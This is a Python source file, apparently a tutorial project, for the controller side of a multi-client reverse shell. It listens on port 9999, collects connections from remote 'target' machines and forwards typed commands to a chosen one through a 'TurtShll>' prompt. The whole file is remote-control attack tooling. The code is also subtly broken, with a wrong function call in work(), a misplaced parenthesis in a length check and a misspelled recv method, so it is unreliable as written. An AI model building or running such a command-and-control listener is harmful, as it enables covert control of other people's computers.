#Multi-threaded, multi-client reverse shell

import socket
import threading
import struct
import sys
from queue import Queue

#Thread 1 handles connections
NUMBER_OF_THREADS = 2 #Optional variable for organization
JOB_NUMBER = [1, 2] #Corresponds with number of threads in line above
queue = Queue()
all_connections = [] #for computer readable ; will hold connection object
all_addresses = [] #for human readable ; will store everyone's IPs


#socket object will allow two computers to connect
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket() #<- actual socket(conversation) between the two machines
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

#Bind socket to port (the host and port that communication will take place) and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5) #<- accepts up to 5 connections
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")

#Send commands to target machine
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()   # v system commands are stored as bytes, so they should be converted to str
        if len(str.encode(cmd)) > 0: #check if any command was actually sent instead of blank input
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8") #<- basic character encoding for string
            print(client_response, end="") #<- won't give newline character at the end after sending command

#Accepts from multiple clients and save to list ; function always running in background waiting for someone to connect, then save info
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:] #deletes everything in list
    del all_addresses[:] #deletes everything in list
    while 1: #infinite loop as long as program runs
        try:
            conn, address = s.accept()
            conn.setblocking(1) #set as 1 so no timeouts
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established with this IP: " + address[0]) #Prints out IP address
        except:
            print("Error accepting connections")

#Interactive prompt for sending commands remotely
def start_turtle_shell():
    while True:
        cmd = input('TurtShll> ')
        if cmd == 'list':
            list_connections() #lists all computers connected
        elif 'select' in cmd:
            conn = get_target(cmd) #gets connections object
            if conn is not None:
                send_target_commands(conn)
        else:
            print("[Command not recognized, please type again]")

#Displays all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480) #if message can be sent from our server and we get response, connection is valid
        except:
            del all_connections[i] #if connection is bad, delete it from list
            del all_addresses[i]
            continue                                   # v IP addr                        # v Port Number
        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n' #for each client connected, display ID num, IP addr, and port so we know who we're connected to
    print('------ Clients ------' + '\n' + results)

#Select target client
def get_target(cmd):
    try:
        target = cmd.replace('select ', '') #target will equal just number in str format
        target = int(target)
        conn = all_connections[target]                      # v IP addr
        print("Now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except:
        print("[Invalid selection]")
        return None

#Connect with remote target client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd) > 0):
                conn.send(str.encode(cmd))
                client_response = str(conn.rec(20480), "utf-8")
                print(client_response, end="")
            if cmd == 'quit':
                break
        except:
            print("Connection lost")
            break

#Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

#Do next job in queue (one handles connections and the other sends commands
def work():
    while True:
        x = queue.get()
        if x == 1: #Thread 1: Handle the connection with these functions
            socket_create()
            socket_bind()
            all_connections()
        if x == 2: #Thread 2: Call this function to allow connection and control of computer
            start_turtle_shell()
        queue.task_done()

#Each list item is new job
def create_new_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()
create_new_jobs()